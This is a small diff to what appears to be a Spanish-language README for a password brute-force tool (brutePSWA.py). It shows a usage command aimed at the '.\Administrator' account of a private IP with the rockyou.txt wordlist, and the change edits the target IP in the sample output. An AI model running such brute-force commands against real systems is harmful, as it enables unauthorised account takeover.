@@ -39,7 +39,7 @@ python3 brutePSWA.py 192.168.1.38 '.\Administrator' rockyou.txt
 Salida esperada:
 
 ```
-[+] Verificando objetivo 192.168.177.134...
+[+] Verificando objetivo 192.168.1.38...
 [+] Objetivo válido, iniciando fuerza bruta contra .\Administrator con rockyou.txt
 
 [1] Probando password: admin123
